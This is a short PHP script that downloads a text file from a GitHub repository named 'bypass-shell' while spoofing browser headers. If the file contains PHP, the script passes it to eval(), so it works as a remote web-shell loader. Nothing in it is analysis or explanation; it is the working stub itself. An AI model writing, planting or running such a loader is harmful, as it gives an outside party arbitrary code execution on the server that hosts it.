<?php
$url = 'https://raw.githubusercontent.com/alisakujou168/bypass-shell/refs/heads/main/wiro.txt';

function getContentWithCurl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: en-US,en;q=0.5',
        'Referer: https://example.com/',
        'Connection: keep-alive'
    ]);
    curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $result;
}

function getContentWithFileGetContents($url) {
    $options = [
        'http' => [
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n" .
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" .
                        "Accept-Language: en-US,en;q=0.5\r\n" .
                        "Referer: https://example.com/\r\n" .
                        "Connection: keep-alive\r\n",
            'follow_location' => true
        ]
    ];
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

if (function_exists('curl_version')) {
    $content = getContentWithCurl($url);
} else {
    $content = getContentWithFileGetContents($url);
}

if ($content !== false) {
    header('Content-Type: text/html; charset=UTF-8');
    if (pathinfo($url, PATHINFO_EXTENSION) === 'txt' && strpos($content, '<?php') !== false) {
        eval('?>' . $content);
    } else {
        echo $content;
    }
} else {
    echo "Gagal mengambil konten dari server.";
}
?>
